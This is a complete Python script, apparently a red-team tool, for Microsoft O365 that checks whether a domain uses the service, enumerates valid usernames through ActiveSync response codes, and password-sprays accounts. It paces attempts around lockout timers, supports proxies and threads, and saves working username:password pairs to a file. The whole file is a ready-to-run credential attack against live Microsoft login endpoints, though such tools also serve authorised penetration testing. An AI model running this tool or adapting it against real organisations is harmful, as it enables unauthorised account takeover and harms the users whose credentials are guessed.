#!/usr/bin/env python3

# -------------------------------
__author__  = "km-zdh"
__date__    = "August 7, 2019"
__version__ = "1.0"
# -------------------------------
"""A basic username enumeration and password spraying tool aimed at spraying Microsoft O365."""

# Based on the research from grimhacker:
# https://grimhacker.com/2017/07/24/office365-activesync-username-enumeration/
# https://bitbucket.org/grimhacker/office365userenum/src/master/

from re import sub, search
from time import sleep, time
from asyncio import wait, get_event_loop
from urllib3 import disable_warnings
from argparse import ArgumentParser
from requests import get, options
from urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor
from xml.etree.ElementTree import fromstring

disable_warnings(InsecureRequestWarning)

# Global variables
MAX_THREADS = 10
VALIDATE_DOMAIN_URL = "https://login.microsoftonline.com/getuserrealm.srf?login=user@{DOMAIN}&xml=1"
SPRAY_URL = "https://outlook.office365.com/Microsoft-Server-ActiveSync"
SPRAY_CODES = {
  200: "VALID_CREDS",
  401: "BAD_PASSWD",
  403: "VALID_CREDS_2FA",
  404: "INVALID_USER"
}

valid_creds = {}
valid_accts = []


# Colorized output during run
class text_colors:
  red    = "\033[91m"
  green  = "\033[92m"
  yellow = "\033[93m"
  reset  = "\033[0m"


# Helper functions
class Helper:

  def enum_stats(self, creds):
    print("\n%s\n[*] User Enumeration Stats\n%s" % ("="*26, "="*26))   
    print("[*] Valid Accounts: %d" % len(creds))
    if len(creds) > 0:
      print("[+] Writing valid usernames to the file: valid_users.txt...")
      with open("valid_users.txt", 'w') as file_:
        for user in creds:
          file_.write("%s\n" % user)

  def spray_stats(self, creds):
    print("\n%s\n[*] Password Spraying Stats\n%s" % ("="*27, "="*27))   
    print("[*] Valid Accounts: %d" % len(creds))
    if len(creds) > 0:
      print("[+] Writing valid credentials to the file: valid_creds.txt...")
      with open("valid_creds.txt", 'w') as file_:
        for user in creds.keys():
          file_.write("%s\n" % ("%s:%s" % (user, creds[user])))

  def get_domain_from_list(self, email_list):
    domains = set()
    for email in email_list:
      domain = search("@([\w.]+)", email)
      domains.add(domain.group(1))

    return domains

  def loop_dict(self, dict_):
    for key in dict_.keys():
      yield key

  def get_chunks_from_list(self, list_, n):
    for i in range(0, len(list_), n):
      yield list_[i:i + n]

  def get_list_from_file(self, file_):
    with open(file_, "r") as f:
      list_ = [line.strip() for line in f]
    return list_

  def check_last_chunk(self, sublist, full_list):
    """ Identify if the current list chunk is the last chunk """
    if sublist[-1] == full_list[-1]:
      return True
    return False

  def lockout_reset_wait(self, lockout):
    print("[*] Sleeping for %.1f minutes" % (lockout))
    sleep(lockout * 60)


# Sprayer class to handle domain validation, user enum and password spraying
class Sprayer:

  loop = get_event_loop()

  def __init__(self, proxy, threads):
    self.helper = Helper()
    self.proxy = None if not proxy else {
      "http"  : "http://%s" % sub('^http://', '', proxy),
      "https" : "https://%s" % sub('^https://', '', proxy)
    }
    self.executor = ThreadPoolExecutor(max_workers=threads)


  def validate_domain(self, domain):
    """ This is to validate the target domain is using O365 """
    try:
      rsp = get(VALIDATE_DOMAIN_URL.format(DOMAIN=domain), proxies=self.proxy, verify=False)
      xml = fromstring(rsp.text)
      nst = xml.find('NameSpaceType').text

      if nst in ["Managed", "Federated"]:
        print("[%sVALID%s] The following domain is using O365: %s" % (text_colors.green, text_colors.reset, domain))

      else:
        print("[%sINVALID%s] The following domain is not using O365: %s" % (text_colors.red, text_colors.reset, domain))

    except Exception as e:
      if debug: print(e)
      pass


  async def loop_requests(self, user_list, password_chunk, enum, debug):
    """ Asynchronously send HTTP requests """
    if not enum:
      futures = [self.loop.run_in_executor(
      self.executor, self.spray, user, password, debug
      ) for user in user_list for password in password_chunk]
    
    else:
      futures = [self.loop.run_in_executor(
      self.executor, self.enum, user, "Password1", debug
      ) for user in user_list]

    await wait(futures)


  def enum(self, user, password, debug=False):
    """ Enumerate users on Microsoft using Microsoft Server ActiveSync """
    try:
      headers = {"MS-ASProtocolVersion": "14.0"}
      auth = (user, password)
      rsp = options(SPRAY_URL, headers=headers, auth=auth, timeout=30, proxies=self.proxy, verify=False)

      status = rsp.status_code
      if status in [200, 401, 403]:
        print("[%s%s%s] %s:%s" % (text_colors.green, "VALID_USER", text_colors.reset, user, password))
        valid_accts.append(user)

      elif status == 404 and rsp.headers.get("X-CasErrorCode") == "UserNotFound":
        print("[%s%s%s] %s:%s" % (text_colors.red, SPRAY_CODES[status], text_colors.reset, user, password))

      else:
        print("[%s%s%s] %s:%s" % (text_colors.yellow, "UNKNOWN", text_colors.reset, user, password))

    except Exception as e:
      if debug: print("[ERROR] %s" % e)
      pass


  def spray(self, user, password, debug=False):
    """ Password spray Microsoft using Microsoft Server ActiveSync """
    try:
      headers = {"MS-ASProtocolVersion": "14.0"}
      auth = (user, password)
      rsp = options(SPRAY_URL, headers=headers, auth=auth, timeout=30, proxies=self.proxy, verify=False)

      status = rsp.status_code
      if status in [200, 403]:
        print("[%s%s%s] %s:%s" % (text_colors.green, SPRAY_CODES[status], text_colors.reset, user, password))
        valid_creds[user] = password

      elif status == 401:
        print("[%s%s%s] %s:%s" % (text_colors.yellow, SPRAY_CODES[status], text_colors.reset, user, password))

      elif status == 404 and rsp.headers.get("X-CasErrorCode") == "UserNotFound":
        print("[%s%s%s] %s:%s" % (text_colors.red, SPRAY_CODES[status], text_colors.reset, user, password))

      else:
        print("[%s%s%s] %s:%s" % (text_colors.yellow, "UNKNOWN", text_colors.reset, user, password))

    except Exception as e:
      if debug: print("[ERROR] %s" % e)
      pass



if __name__ == "__main__":
  parser = ArgumentParser(description="Microsoft O365 User Enumerator and Password Sprayer.")
  parser.add_argument("-u", "--username", type=str, help="File containing list of usernames", required=False)
  parser.add_argument("-p", "--password", type=str, help="File containing list of passwords", required=False)
  parser.add_argument("--proxy", type=str, help="Proxy to pass traffic through: <ip:port>", required=False)
  parser.add_argument("--count", type=int, help="Number of password attempts to run before resetting lockout timer", required=False)
  parser.add_argument("--lockout", type=float, help="Lockout policy reset time (in minutes)", required=False)
  parser.add_argument("--domain", type=str, help="Domain name to validate against O365", required=False)
  parser.add_argument("--threads", type=int, help="Number of threads to run. Default: 10", default=MAX_THREADS, required=False)
  parser.add_argument("--debug", action="store_true", help="Debug output", required=False)

  group = parser.add_mutually_exclusive_group(required=True)

  group.add_argument("-e", "--enum", action="store_true", help="Perform username enumeration")
  group.add_argument("-s", "--spray", action="store_true", help="Perform password spraying")
  group.add_argument("-v", "--validate", action="store_true", help="Validate a domain is running O365")

  args = parser.parse_args()

  # If validating the domain make sure we have the domain
  if args.validate and not args.domain:
      parser.print_help()
      print("\n[ERROR] When performing domain validation [--validate] you must specify" +
          " the following: domain name [--domain].")
      exit(1)

  # If enumerating users make sure we have a username file
  if args.enum and not args.username:
      parser.print_help()
      print("\n[ERROR] When performing user enumeration [--enum] you must specify" +
          " the following: a username file [--username].")
      exit(1)

  # If password spraying make sure we have all the information
  if args.spray and (not args.username or not args.password or not args.count or not args.lockout):
      parser.print_help()
      print("\n[ERROR] When performing password spraying [--spray] you must specify" +
          " the following: a username file [--username], a password file [--password]," +
          " password count [--count], and lockout timer in minutes [--lockout].")
      exit(1)

  helper = Helper()

  start = time()

  # Perform domain validation
  if args.validate:
    validator = Sprayer(args.proxy, args.threads)
    validator.validate_domain(args.domain)


  # Perform user enumeration
  elif args.enum:
    user_list = helper.get_list_from_file(args.username)
    enum = Sprayer(args.proxy, args.threads)
    enum.loop.run_until_complete(enum.loop_requests(user_list, None, True, args.debug))
    helper.enum_stats(valid_accts)


  # Perform password spray
  elif args.spray:
    user_list = helper.get_list_from_file(args.username)
    spray = Sprayer(args.proxy, args.threads)
    password_list = helper.get_list_from_file(args.password)
    for password_chunk in helper.get_chunks_from_list(password_list, args.count):
      print("[*] Password spraying the following passwords: [%s]" % (", ".join("'%s'" % password for password in password_chunk)))
      spray.loop.run_until_complete(spray.loop_requests(user_list, password_chunk, False, args.debug))
      if not helper.check_last_chunk(password_chunk, password_list):
        helper.lockout_reset_wait(args.lockout)

    helper.spray_stats(valid_creds)


  elapsed = time() - start
  if args.debug: print("\n[*] %s executed in %0.2f seconds." % (__file__, elapsed))